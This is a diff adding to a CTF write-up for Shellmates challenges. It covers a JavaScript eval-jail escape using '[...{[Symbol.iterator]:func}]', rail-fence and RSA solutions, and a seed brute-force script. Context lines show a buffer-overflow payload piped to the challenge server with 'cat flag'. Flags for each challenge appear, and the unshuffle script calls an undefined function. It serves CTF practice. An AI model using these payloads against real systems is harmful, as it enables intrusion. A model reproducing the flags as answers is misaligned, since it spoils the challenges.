@@ -298,6 +298,62 @@ pickle.dump(MYClass(), outfile)
 
 > flag : shellmates{lEt_thE_piCkl3_gaMeS_BegiN!}
 
+### JsandboxS
+
+    Just a casual JS jail. Retrieve the flag and get out of this jail.
+
+> Author : yh_0x7
+
+In this challenge they give us a js code which has a generator function "func" which prints the flag, and a function that takes input and validates it with a regex filter then passes it to the eval function.
+
+if we read the regex we can see that our goal is to call the func function without parenthesis, if we do some research we can find a lot a methods for example in our case we used : [...{[Symbol.iterator]:func}] which did the trick.
+
+```javascript
+#!/usr/bin/env node
+var fs = require('fs');
+
+const black_list = "0123456789!\"#$%&'()*+-/;<>?@\\^|~\t\n\r\x0b\x0c "
+
+function * func(){
+    fs.readFile('./.passwd', 'utf8', function(err, data){
+        console.log(data);
+    });
+}
+
+const readline = require("readline");
+const interface = readline.createInterface({
+        input: process.stdin,
+        output: process.stdout,
+    });
+
+interface.question(
+    "Welcome to JsandboxS, I gave you a secret phone, you have use it to escape \n",
+    function (input) {
+        interface.close();
+        if ( !black_list.split("").some(x => input.includes(x)) )
+        {
+            try 
+            {
+                eval(input)
+            }
+            catch(e)
+            {
+                    console.log('you can\'t break the walls :(')
+            }
+        }
+        else
+        {
+            console.log('you still in jail...you can\'t escape like that')
+        }
+    }
+
+);
+```
+
+> exploit : [...{[Symbol.iterator]:func}]
+
+> flag : shellmates{y0U_d0N'7_P4r3n7H3515_70_c4Ll_M3}
+
 
 ## PWN
 
@@ -354,3 +410,121 @@ print(output)
 > exploit : printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x91\x04\x08aaaa\x39\x05\x00\x00\ncat flag" | ncat -v --ssl bof1.challs.shellmates.club 443
 
 > flag : shellamtes{Y0u_4lS0_GET_A_$HEll_65431}
+
+
+## Crypto
+
+### Steam Locomotive
+
+    I wrote a message, but a train ran over it and messed it up, can you recover it? Do you know what the sl command do?
+
+> Author : badsUwU
+
+    In this challenge they gave us a file 'enc' which contains encrypted text, so we should just find which encryption method that they used, the challenge name is steam locomotive so the encryption method will be similar, after some research we can find the Rail Fence Cipher which did the trick for us.
+
+> flag : shellmates{u$e_L$_Not_$l_t0_LI$T_7h3_con7En7_0f_4_diREC70rY}
+
+
+### neighbors
+
+> level : easy/medium
+
+    They say it's such a rookie mistake to do.
+    Can you find it?
+    
+> Author : Ouxs
+
+    In this challenge they gave us the script which they used to crete chall file wich contains the encrypted text, we can see that they used the RSA algorithm and we can see the q and e that we can use to encrypt the text.
+
+> exploit : rsactftool -n {the N number} -e {the e number} -uncipher {the c}
+
+> flag : shellmates{F3RM47_H4S_Ju57_T0Ok_R$A_D0WN}
+
+### Night Coder
+
+    I am a night coder, are you? 
+
+> Author : Chih3b
+
+    In thi challenge they gave us a python script that seeds with current date then chuffles the flag, and we have the resultant flag, so in this case we should define unshuffle wich reverses shuffle function and brute force the seed(its around thursday at 00:00 until 12:00 (morning))
+
+```python
+import random 
+import datetime
+from secret import flag
+
+#Im a night coder, i coded this at night (thursday morning)
+
+def seed_shuffler(my_list, seed):
+  random.seed(seed)
+  random.shuffle(my_list)
+  return my_list
+
+seed=int(datetime.datetime.now().strftime('%Y%m%d%H%M'))
+
+flag = [f for f in flag]
+enc = seed_shuffler(flag,seed)
+
+print("".join(enc))
+
+#result at that time: "N_gs{aesD_he_3AtrsOLlh3ROT1sECRl0m}s"
+```
+
+    after editing the script we have
+
+```python
+
+import random 
+import datetime
+from datetime import timedelta
+import numpy as np
+
+#Im a night coder, i coded this at night (thursday morning)
+def seed_shuffler(my_list, seed):
+  random.seed(seed)
+  random.shuffle(my_list)
+  return my_list
+
+def unshuffle_list(shuffled_ls, seed):
+  n = len(shuffled_ls)
+  # Perm is [1, 2, ..., n]
+  perm = [i for i in range(1, n + 1)]
+  # Apply sigma to perm
+  shuffled_perm = shuffle_under_seed(perm, seed)
+  # Zip and unshuffle
+  zipped_ls = list(zip(shuffled_ls, shuffled_perm))
+  zipped_ls.sort(key=lambda x: x[1])
+  return [a for (a, b) in zipped_ls]
+
+flag = "N_gs{aesD_he_3AtrsOLlh3ROT1sECRl0m}s"
+
+flag = [f for f in flag]
+
+for i in range(100000):
+
+  seed=int((datetime.datetime.now() - timedelta(minutes=i)).strftime('%Y%m%d%H%M'))
+  
+  enc = seed_shuffler(flag.copy(),seed)
+  dec = unshuffle_list(flag.copy(), seed)
+
+  if "shellmates" in "".join(dec):
+    print(seed)
+    print("".join(enc))
+    print("".join(dec))
+    break
+
+#result at that time: "N_gs{aesD_he_3AtrsOLlh3ROT1sECRl0m}s"
+```
+
+> flag : shellmates{N1ghT_C0D3Rs_ArE_LOOs3Rs} 
+
+
+## forensics
+
+### lies
+
+    I asked my friend where is he, he lied to me through this picture, can you find the datetime of the pic and prove me right?
+    Flag format shellmates{YY:MM:DD} 
+> Author : Chih3b
+
+to be continued <<
